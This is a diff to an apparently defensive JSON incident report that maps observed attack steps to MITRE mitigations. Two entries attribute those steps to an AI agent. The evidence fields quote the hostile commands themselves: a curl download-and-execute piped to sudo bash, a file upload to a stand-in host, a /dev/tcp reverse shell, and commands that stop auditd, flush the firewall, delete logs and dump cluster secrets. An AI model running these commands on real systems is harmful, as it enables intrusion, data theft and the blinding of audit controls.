-    "atlas": null
+    "atlas": null,
+    "targets": "service auditd",
+    "evidence": "SecurityToolDisabling: systemctl stop auditd (20261022_092000_step05_evade.sh:4)\nSecurityToolDisabling: systemctl stop auditd (audit_20261022_093500.jsonl)\nFirewallDisabling: iptables -F (20261022_092000_step05_evade.sh:5)\nFirewallDisabling: iptables -F (audit_20261022_093500.jsonl)"
   },
   {
     "item": "Block and hunt the infrastructure",
@@ -607,7 +1039,9 @@
     "basis": "ShellDownloadAndExecute, FileUpload, ReverseShell",
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H)",
+    "evidence": "ShellDownloadAndExecute: sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)\nFileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)\nReverseShell: os.system(\"exec 3<>/dev/tcp/$H/$PORT\") (20261022_093000_step07_channel.py:8)"
   },
   {
     "item": "Scope the data taken",
@@ -617,7 +1051,9 @@
     "basis": "FileUpload, ArchiveCreation, Collection tools, Exfiltration tools",
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "url https://files.example.net/up; file out.tgz; archive out.tgz",
+    "evidence": "FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)\nArchiveCreation: tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)\ngzip: gzip {} (20261022_092500_step06_stage.sh:7)\nnc: nc -zv 203.0.113.41 443 (20261022_093000_step07_channel.py:7)"
   },
   {
     "item": "Find the delivered files",
@@ -627,7 +1063,9 @@
     "basis": "ShellDownloadAndExecute",
     "files": "20261022_092500_step06_stage.sh",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "url http://203.0.113.40/s.sh",
+    "evidence": "ShellDownloadAndExecute: sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)"
   },
   {
     "item": "Recover the missing logs",
@@ -637,17 +1075,21 @@
     "basis": "LogDeletion, HistoryClearing, HistoryDisabling, Timestomp, DefenseImpairment tools",
     "files": "20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "log /var/log/auth.log; setting HISTFILE",
+    "evidence": "LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)\nHistoryClearing: history -c (20261022_092000_step05_evade.sh:7)\nHistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)\nTimestomp: touch -r /bin/ls \"$F\" (20261022_092000_step05_evade.sh:8)\niptables: iptables -F (20261022_092000_step05_evade.sh:5)\niptables: iptables -F (audit_20261022_093500.jsonl)"
   },
   {
     "item": "Follow what was enumerated",
     "section": "remediation",
     "value": "low",
     "detail": "Use what was listed to predict targets: check those identities, vaults and hosts for later activity.",
-    "basis": "SetuidFileSearch, ServiceDiscovery, Discovery tools",
-    "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_092500_step06_stage.sh",
+    "basis": "SetuidFileSearch, ServiceDiscovery, Discovery tools, exposed username, exposed email, exposed device, exposed ip",
+    "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_092500_step06_stage.sh, audit_20261022_093500.jsonl, env_20261022_090540.txt, hosts_20261022_090025.txt, passwd_20261022_090020.txt",
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "targets": "searched /; service sshd; username alerts@corp.example; username app_rw; username daemon; username deploy; username root; username svc; email alerts@corp.example; device build01.corp.internal; device db01.corp.internal; ip 10.20.30.5; ip 10.20.30.6",
+    "evidence": "SetuidFileSearch: find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)\nServiceDiscovery: systemctl status sshd (20261022_090000_step01_recon.sh:7)\nid: id (20261022_090000_step01_recon.sh:3)\nuname: uname -a (20261022_090000_step01_recon.sh:3)\nkubectl: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)\ndocker: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)\nfind: find /srv -name '*.bak' -exec gzip {} \\; (20261022_092500_step06_stage.sh:7)\nid: id (20261022_092500_step06_stage.sh:1)\nuname: uname -a (20261022_092500_step06_stage.sh:1)"
   },
   {
     "item": "M1017 User Training",
@@ -657,7 +1099,9 @@
     "basis": "CredentialFileRead",
     "files": "20261022_090500_step02_creds.sh",
     "attack": "T1552.001",
-    "atlas": null
+    "atlas": null,
+    "targets": "CredentialFileRead: file ~/.aws/credentials",
+    "evidence": null
   },
   {
     "item": "M1018 User Account Management",
@@ -667,7 +1111,9 @@
     "basis": "FileUpload, ScheduledJobCreation, SshKeyPersistence, SystemdUnitCreation, ClusterSecretRead, SecurityToolDisabling, FirewallDisabling",
     "files": "20261022_090500_step02_creds.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, audit_20261022_093500.jsonl",
     "attack": "T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; SshKeyPersistence: file ~/.ssh/authorized_keys; SystemdUnitCreation: unit sync.service; SecurityToolDisabling: service auditd",
+    "evidence": null
   },
   {
     "item": "M1022 Restrict File and Directory Permissions",
@@ -677,7 +1123,9 @@
     "basis": "FileUpload, ScheduledJobCreation, HistoryClearing, SshKeyPersistence, SystemdUnitCreation, ShellProfilePersistence, SudoersModification, CredentialFileRead, PrivateKeyRead, SecurityToolDisabling, LogDeletion, FirewallDisabling",
     "files": "20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, audit_20261022_093500.jsonl",
     "attack": "T1048, T1053.006, T1070.003, T1098.004, T1543.002, T1546.004, T1548.003, T1552.001, T1552.004, T1685, T1685.006, T1686",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; SshKeyPersistence: file ~/.ssh/authorized_keys; SystemdUnitCreation: unit sync.service; ShellProfilePersistence: file ~/.bashrc; SudoersModification: file /etc/sudoers.d/svc; CredentialFileRead: file ~/.aws/credentials; PrivateKeyRead: file ~/.ssh/id_rsa; SecurityToolDisabling: service auditd; LogDeletion: log /var/log/auth.log",
+    "evidence": null
   },
   {
     "item": "M1024 Restrict Registry Permissions",
@@ -687,7 +1135,9 @@
     "basis": "SecurityToolDisabling, FirewallDisabling",
     "files": "20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": "T1685, T1686",
-    "atlas": null
+    "atlas": null,
+    "targets": "SecurityToolDisabling: service auditd",
+    "evidence": null
   },
   {
     "item": "M1026 Privileged Account Management",
@@ -697,7 +1147,9 @@
     "basis": "ShadowFileRead, ScheduledJobCreation, AccountCreation, SystemdUnitCreation, SudoersModification, ClusterSecretRead, ContainerEscape",
     "files": "20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attack": "T1003.008, T1053.002, T1053.006, T1136.001, T1543.002, T1548.003, T1552.007, T1611",
-    "atlas": null
+    "atlas": null,
+    "targets": "ShadowFileRead: file /etc/shadow; AccountCreation: account svc; SystemdUnitCreation: unit sync.service; SudoersModification: file /etc/sudoers.d/svc; ContainerEscape: mount /:/host",
+    "evidence": null
   },
   {
     "item": "M1027 Password Policies",
@@ -707,7 +1159,9 @@
     "basis": "ShadowFileRead, CredentialFileRead, PrivateKeyRead",
     "files": "20261022_090500_step02_creds.sh",
     "attack": "T1003.008, T1552.001, T1552.004",
-    "atlas": null
+    "atlas": null,
+    "targets": "ShadowFileRead: file /etc/shadow; CredentialFileRead: file ~/.aws/credentials; PrivateKeyRead: file ~/.ssh/id_rsa",
+    "evidence": null
   },
   {
     "item": "M1028 Operating System Configuration",
@@ -717,7 +1171,9 @@
     "basis": "ScheduledJobCreation, SetuidBit, SudoersModification, ShellHistoryRead, HistoryDisabling",
     "files": "20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": "T1053.002, T1548.001, T1548.003, T1552.003, T1690",
-    "atlas": null
+    "atlas": null,
+    "targets": "SetuidBit: file /tmp/tool ($F); SudoersModification: file /etc/sudoers.d/svc; ShellHistoryRead: file ~/.bash_history; HistoryDisabling: setting HISTFILE",
+    "evidence": null
   },
   {
     "item": "M1029 Remote Data Storage",
@@ -727,7 +1183,9 @@
     "basis": "HistoryClearing, LogDeletion",
     "files": "20261022_092000_step05_evade.sh",
     "attack": "T1070.003, T1685.006",
-    "atlas": null
+    "atlas": null,
+    "targets": "LogDeletion: log /var/log/auth.log",
+    "evidence": null
   },
   {
     "item": "M1030 Network Segmentation",
@@ -737,7 +1195,9 @@
     "basis": "FileUpload, ReverseShell, ClusterSecretRead",
     "files": "20261022_090500_step02_creds.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1048, T1095, T1552.007",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H)",
+    "evidence": null
   },
   {
     "item": "M1031 Network Intrusion Prevention",
@@ -747,7 +1207,9 @@
     "basis": "FileUpload, ReverseShell, ShellDownloadAndExecute",
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1048, T1095, T1105",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H); ShellDownloadAndExecute: url http://203.0.113.40/s.sh",
+    "evidence": null
   },
   {
     "item": "M1032 Multi-factor Authentication",
@@ -757,7 +1219,9 @@
     "basis": "AccountCreation",
     "files": "20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attack": "T1136.001",
-    "atlas": null
+    "atlas": null,
+    "targets": "AccountCreation: account svc",
+    "evidence": null
   },
   {
     "item": "M1033 Limit Software Installation",
@@ -767,7 +1231,9 @@
     "basis": "SystemdUnitCreation",
     "files": "20261022_091500_step04_persist.sh",
     "attack": "T1543.002",
-    "atlas": null
+    "atlas": null,
+    "targets": "SystemdUnitCreation: unit sync.service",
+    "evidence": null
   },
   {
     "item": "M1035 Limit Access to Resource Over Network",
@@ -777,7 +1243,9 @@
     "basis": "CloudMetadataAccess, ClusterSecretRead",
     "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh",
     "attack": "T1552.005, T1552.007",
-    "atlas": null
+    "atlas": null,
+    "targets": "CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/",
+    "evidence": null
   },
   {
     "item": "M1037 Filter Network Traffic",
@@ -787,7 +1255,9 @@
     "basis": "FileUpload, ReverseShell, ShellDownloadAndExecute, CloudMetadataAccess",
     "files": "20261022_090000_step01_recon.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1048, T1095, T1105, T1552.005",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H); ShellDownloadAndExecute: url http://203.0.113.40/s.sh; CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/",
+    "evidence": null
   },
   {
     "item": "M1038 Execution Prevention",
@@ -797,7 +1267,9 @@
     "basis": "ShellDownloadAndExecute, ReverseShell, ContainerEscape, SecurityToolDisabling",
     "files": "20261022_091000_step03_privesc.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py, audit_20261022_093500.jsonl",
     "attack": "T1059.004, T1611, T1685",
-    "atlas": null
+    "atlas": null,
+    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; ReverseShell: host 203.0.113.41 ($H); ContainerEscape: mount /:/host; SecurityToolDisabling: service auditd",
+    "evidence": null
   },
   {
     "item": "M1039 Environment Variable Permissions",
@@ -807,7 +1279,9 @@
     "basis": "HistoryClearing, HistoryDisabling",
     "files": "20261022_092000_step05_evade.sh",
     "attack": "T1070.003, T1690",
-    "atlas": null
+    "atlas": null,
+    "targets": "HistoryDisabling: setting HISTFILE",
+    "evidence": null
   },
   {
     "item": "M1041 Encrypt Sensitive Information",
@@ -817,7 +1291,9 @@
     "basis": "PrivateKeyRead, LogDeletion",
     "files": "20261022_090500_step02_creds.sh, 20261022_092000_step05_evade.sh",
     "attack": "T1552.004, T1685.006",
-    "atlas": null
+    "atlas": null,
+    "targets": "PrivateKeyRead: file ~/.ssh/id_rsa; LogDeletion: log /var/log/auth.log",
+    "evidence": null
   },
   {
     "item": "M1042 Disable or Remove Feature or Program",
@@ -827,7 +1303,9 @@
     "basis": "SshKeyPersistence, CloudMetadataAccess, ContainerEscape, SecurityToolDisabling",
     "files": "20261022_090000_step01_recon.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": "T1098.004, T1552.005, T1611, T1685",
-    "atlas": null
+    "atlas": null,
+    "targets": "SshKeyPersistence: file ~/.ssh/authorized_keys; CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/; ContainerEscape: mount /:/host; SecurityToolDisabling: service auditd",
+    "evidence": null
   },
   {
     "item": "M1047 Audit",
@@ -837,7 +1315,9 @@
     "basis": "ScheduledJobCreation, ReverseShell, CredentialFileRead, PrivateKeyRead, ArchiveCreation, SecurityToolDisabling, FirewallDisabling",
     "files": "20261022_090500_step02_creds.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py, audit_20261022_093500.jsonl",
     "attack": "T1053.002, T1053.003, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686",
-    "atlas": null
+    "atlas": null,
+    "targets": "ReverseShell: host 203.0.113.41 ($H); CredentialFileRead: file ~/.aws/credentials; PrivateKeyRead: file ~/.ssh/id_rsa; ArchiveCreation: archive out.tgz; SecurityToolDisabling: service auditd",
+    "evidence": null
   },
   {
     "item": "M1048 Application Isolation and Sandboxing",
@@ -847,7 +1327,9 @@
     "basis": "ContainerEscape",
     "files": "20261022_091000_step03_privesc.sh",
     "attack": "T1611",
-    "atlas": null
+    "atlas": null,
+    "targets": "ContainerEscape: mount /:/host",
+    "evidence": null
   },
   {
     "item": "M1051 Update Software",
@@ -857,7 +1339,9 @@
     "basis": "ContainerEscape",
     "files": "20261022_091000_step03_privesc.sh",
     "attack": "T1611",
-    "atlas": null
+    "atlas": null,
+    "targets": "ContainerEscape: mount /:/host",
+    "evidence": null
   },
   {
     "item": "M1054 Software Configuration",
@@ -867,7 +1351,9 @@
     "basis": "SecurityToolDisabling",
     "files": "20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": "T1685",
-    "atlas": null
+    "atlas": null,
+    "targets": "SecurityToolDisabling: service auditd",
+    "evidence": null
   },
   {
     "item": "M1057 Data Loss Prevention",
@@ -877,7 +1363,9 @@
     "basis": "FileUpload",
     "files": "20261022_092500_step06_stage.sh",
     "attack": "T1048",
-    "atlas": null
+    "atlas": null,
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz",
+    "evidence": null
   },
   {
     "item": "AML.M0005 Control Access to AI Models and Data at Rest",
@@ -887,7 +1375,9 @@
     "basis": "FileUpload",
     "files": "20261022_092500_step06_stage.sh",
     "attack": null,
-    "atlas": "AML.T0025"
+    "atlas": "AML.T0025",
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz",
+    "evidence": null
   },
   {
     "item": "AML.M0011 Restrict Library Loading",
@@ -897,7 +1387,9 @@
     "basis": "ShellDownloadAndExecute, ReverseShell, ShadowFileRead, ShellProfilePersistence",
     "files": "20261022_090500_step02_creds.sh, 20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": null,
-    "atlas": "AML.T0050, AML.T0090, AML.T0142"
+    "atlas": "AML.T0050, AML.T0090, AML.T0142",
+    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; ReverseShell: host 203.0.113.41 ($H); ShadowFileRead: file /etc/shadow; ShellProfilePersistence: file ~/.bashrc",
+    "evidence": null
   },
   {
     "item": "AML.M0013 Code Signing",
@@ -907,7 +1399,9 @@
     "basis": "ShellProfilePersistence",
     "files": "20261022_091500_step04_persist.sh",
     "attack": null,
-    "atlas": "AML.T0142"
+    "atlas": "AML.T0142",
+    "targets": "ShellProfilePersistence: file ~/.bashrc",
+    "evidence": null
   },
   {
     "item": "AML.M0043 AI Agent External Resource Lifecycle Management",
@@ -917,7 +1411,9 @@
     "basis": "ShellDownloadAndExecute, AccountCreation",
     "files": "20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, audit_20261022_093500.jsonl",
     "attack": null,
-    "atlas": "AML.T0072, AML.T0125"
+    "atlas": "AML.T0072, AML.T0125",
+    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; AccountCreation: account svc",
+    "evidence": null
   },
   {
     "item": "AML.M0020 Generative AI Guardrails",
@@ -927,7 +1423,9 @@
     "basis": "Commands generated by an AI agent",
     "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py, audit_20261022_093500.jsonl",
     "attack": null,
-    "atlas": "AML.T0102"
+    "atlas": "AML.T0102",
+    "targets": null,
+    "evidence": null
   },
   {
     "item": "AML.M0022 Generative AI Model Alignment",
@@ -937,6 +1435,8 @@
     "basis": "Commands generated by an AI agent",
     "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py, audit_20261022_093500.jsonl",
     "attack": null,
-    "atlas": "AML.T0102"
+    "atlas": "AML.T0102",
+    "targets": null,
+    "evidence": null
   }
 ]
